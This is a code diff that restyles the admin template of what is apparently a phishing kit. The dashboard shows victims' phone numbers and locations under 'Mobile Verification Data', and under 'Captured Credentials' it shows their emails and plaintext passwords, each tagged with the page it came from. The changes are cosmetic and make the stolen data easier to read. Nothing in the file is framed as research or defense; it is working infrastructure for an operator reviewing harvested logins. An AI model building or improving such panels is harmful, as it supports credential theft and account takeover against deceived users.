@@ -1,66 +1,119 @@
 {% extends "base.html" %}
 {% block content %}
 
-<h2 style="color: #000;">Admin Panel</h2>
+<style>
+    /* Expand the container for the admin page only */
+    .container {
+        max-width: 95% !important;
+        width: 1600px !important;
+        padding: 30px !important;
+    }
+
+    h2,
+    h3 {
+        color: #000 !important;
+    }
+
+    .admin-flex-container {
+        display: flex;
+        gap: 30px;
+        align-items: flex-start;
+        width: 100%;
+        color: #000;
+    }
+
+    .admin-card {
+        background: #f8f9fa;
+        padding: 25px;
+        border-radius: 12px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        color: #000;
+        overflow-x: auto;
+    }
+
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        background: white;
+        color: #000;
+        font-size: 1.05em;
+        /* Bigger font */
+    }
+
+    th,
+    td {
+        padding: 12px 15px !important;
+        border: 1px solid #dee2e6 !important;
+        color: #000 !important;
+    }
+
+    thead {
+        background: #e9ecef;
+    }
+
+    .source-badge {
+        background: #eee;
+        padding: 4px 8px;
+        border-radius: 4px;
+        font-size: 0.9em;
+        color: #000;
+        font-weight: bold;
+    }
+</style>
+
+<h2 style="margin-top: 0;">Admin Panel</h2>
 <p style="text-align: right;"><a href="/admin/logout"
-        style="color: #dc3545; font-weight: bold; text-decoration: none;">&larr; Logout</a></p>
+        style="color: #dc3545; font-weight: bold; text-decoration: none; font-size: 1.1em;">&larr; Logout</a></p>
 
-<div style="display: flex; flex-direction: column; gap: 40px; max-width: 1200px; margin: 0 auto; color: #000;">
+<div class="admin-flex-container">
 
-    <!-- TOP: Mobile Data (Phone & Location) -->
-    <div
-        style="background: #f8f9fa; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); color: #000;">
-        <h3 style="border-bottom: 2px solid #007bff; padding-bottom: 10px; margin-top: 0; color: #000;">Mobile
-            Verification Data</h3>
-        <table border="1" cellpadding="12"
-            style="width: 100%; border-collapse: collapse; background: white; color: #000;">
-            <thead style="background: #e9ecef;">
+    <!-- LEFT: Mobile Data (Phone & Location) - Flex 1 -->
+    <div class="admin-card" style="flex: 1;">
+        <h3 style="border-bottom: 3px solid #007bff; padding-bottom: 10px; margin-top: 0;">Mobile Verification Data</h3>
+        <table>
+            <thead>
                 <tr>
-                    <th style="text-align: left; color: #000;">ID</th>
-                    <th style="text-align: left; color: #000;">Phone</th>
-                    <th style="text-align: left; color: #000;">Location / Device Info</th>
-                    <th style="text-align: left; width: 180px; white-space: nowrap; color: #000;">Time (PKT)</th>
+                    <th>ID</th>
+                    <th>Phone</th>
+                    <th>Location</th>
+                    <th style="white-space: nowrap;">Time (PKT)</th>
                 </tr>
             </thead>
             <tbody>
                 {% for row in mobile_data %}
-                <tr style="color: #000;">
+                <tr>
                     <td>{{ row.id }}</td>
-                    <td>{{ row.phone }}</td>
-                    <td style="word-break: break-all;">{{ row.location }}</td>
-                    <td style="white-space: nowrap;">{{ row.timestamp.strftime('%Y-%m-%d %I:%M %p') }}</td>
+                    <td style="font-weight: bold;">{{ row.phone }}</td>
+                    <td style="word-break: break-all; font-size: 0.9em;">{{ row.location }}</td>
+                    <td style="white-space: nowrap;">{{ row.timestamp.strftime('%I:%M %p') }}</td>
                 </tr>
                 {% endfor %}
             </tbody>
         </table>
     </div>
 
-    <!-- BOTTOM: Credentials (Email & Password) -->
-    <div
-        style="background: #f8f9fa; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); color: #000;">
-        <h3 style="border-bottom: 2px solid #28a745; padding-bottom: 10px; margin-top: 0; color: #000;">Captured
-            Credentials</h3>
-        <table border="1" cellpadding="12"
-            style="width: 100%; border-collapse: collapse; background: white; color: #000;">
-            <thead style="background: #e9ecef;">
+    <!-- RIGHT: Credentials (Email & Password) - Flex 1.4 for more room -->
+    <div class="admin-card" style="flex: 1.4;">
+        <h3 style="border-bottom: 3px solid #28a745; padding-bottom: 10px; margin-top: 0;">Captured Credentials</h3>
+        <table>
+            <thead>
                 <tr>
-                    <th style="text-align: left; color: #000;">ID</th>
-                    <th style="text-align: left; color: #000;">Page</th>
-                    <th style="text-align: left; color: #000;">Email</th>
-                    <th style="text-align: left; color: #000;">Password</th>
-                    <th style="text-align: left; width: 180px; white-space: nowrap; color: #000;">Time (PKT)</th>
+                    <th>ID</th>
+                    <th>Page</th>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th style="white-space: nowrap;">Time (PKT)</th>
                 </tr>
             </thead>
             <tbody>
                 {% for row in other_data %}
-                <tr style="color: #000;">
+                <tr>
                     <td>{{ row.id }}</td>
-                    <td><span
-                            style="background: #eee; padding: 2px 6px; border-radius: 4px; font-size: 0.9em; color: #000;">{{
-                            row.page }}</span></td>
-                    <td>{{ row.email }}</td>
-                    <td><code style="color: #000;">{{ row.password }}</code></td>
-                    <td style="white-space: nowrap;">{{ row.timestamp.strftime('%Y-%m-%d %I:%M %p') }}</td>
+                    <td><span class="source-badge">{{ row.page }}</span></td>
+                    <td style="color: #003366;">{{ row.email }}</td>
+                    <td><code style="color: #d63384; font-weight: bold; font-size: 1.1em;">{{ row.password }}</code>
+                    </td>
+                    <td style="white-space: nowrap;">{{ row.timestamp.strftime('%I:%M %p') }}</td>
                 </tr>
                 {% endfor %}
             </tbody>
